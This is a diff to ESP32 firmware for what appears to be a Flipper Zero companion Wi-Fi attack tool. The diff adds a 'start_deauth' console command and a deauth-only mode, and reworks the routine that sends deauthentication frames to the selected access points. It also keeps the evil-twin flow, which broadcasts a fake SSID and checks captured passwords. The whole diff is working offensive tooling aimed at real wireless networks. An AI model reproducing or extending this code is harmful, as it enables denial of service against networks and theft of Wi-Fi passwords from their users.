@@ -192,18 +192,6 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
     connectAttemptCount = 0;
     MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
-
-    //this would be blocking!
-    // while (connectAttemptCount<10) {
-    //     if (applicationState == EVIL_TWIN_PASS_CHECK) {
-    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d", connectAttemptCount);
-    //         esp_wifi_connect();
-    //         vTaskDelay(pdMS_TO_TICKS(1000));
-    //         connectAttemptCount++;
-    //     } else {
-    //         ESP_LOGW(TAG, "Evil twin: connect attempt number %d but state is already %d", connectAttemptCount, applicationState);
-    //     }
-    // }
 }
 
 static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
@@ -337,6 +325,7 @@ static void print_network_csv(int index, const wifi_ap_record_t* ap) {
                 ap->primary,
                 ap->rssi,
                 ap->primary <= 14 ? "2.4GHz" : "5GHz");
+    vTaskDelay(pdMS_TO_TICKS(50));
 }
 
 
@@ -390,6 +379,7 @@ static int cmd_select_networks(int argc, char **argv) {
     g_selected_count = 0;
     for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
         int idx = atoi(argv[i]);
+        idx--;//because flipper app uses indexes from 1
         if (idx < 0 || idx >= (int)g_scan_count) {
             ESP_LOGW(TAG,"Fuck it, index %d (out of bounds 0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
             continue;
@@ -413,6 +403,14 @@ static int cmd_select_networks(int argc, char **argv) {
 
 
     return 0;
+}
+
+
+int onlyDeauth = 0;
+
+static int cmd_start_deauth(int argc, char **argv) {
+    onlyDeauth = 1;
+    return cmd_start_evil_twin(argc, argv);
 }
 
 
@@ -440,11 +438,13 @@ static int cmd_start_evil_twin(int argc, char **argv) {
         }
 
         //send evil ssid to ESP32 via ESP-NOW
-        char msg[100];
-        sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
-        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-        vTaskDelay(pdMS_TO_TICKS(100));
-        ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
+        if (!onlyDeauth) {
+            char msg[100];
+            sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
+            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(100));
+            ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
+        }
 
         MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
         for (int i = 0; i < g_selected_count; ++i) {
@@ -510,6 +510,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));
+
+    const esp_console_cmd_t deauth_cmd = {
+        .command = "start_deauth",
+        .help = "Starts Deauth attack.",
+        .hint = NULL,
+        .func = &cmd_start_deauth,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));
 
     const esp_console_cmd_t reboot_cmd = {
         .command = "reboot",
@@ -601,24 +610,26 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         return;
     }
 
-    //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
-    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-    MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
-    vTaskDelay(pdMS_TO_TICKS(300));
-    MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
+    if (!onlyDeauth) {
+        //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
+        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+        //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
+        vTaskDelay(pdMS_TO_TICKS(300));
+        //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
+    }
+
     //then, proceed with deauth frames on channels of the APs:
     for (int i = 0; i < g_selected_count; ++i) {
 
             if (applicationState == EVIL_TWIN_PASS_CHECK ) {
-                ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here, exiting the loop...");
+                ESP_LOGW(TAG, "Checking for password...");
                 return;
             }
 
             int idx = g_selected_indices[i];
             wifi_ap_record_t *ap_record = &g_scan_results[idx];
             ESP_LOGD(TAG, "Preparations to send deauth frame...");
-            MY_LOG_INFO(TAG, "Target SSID: %s", ap_record->ssid);
-            MY_LOG_INFO(TAG, "Target CHANNEL: %d", ap_record->primary);
+            MY_LOG_INFO(TAG, "Deauth SSID: %s, CH: %d", ap_record->ssid, ap_record->primary);
             ESP_LOGD(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                     ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                     ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
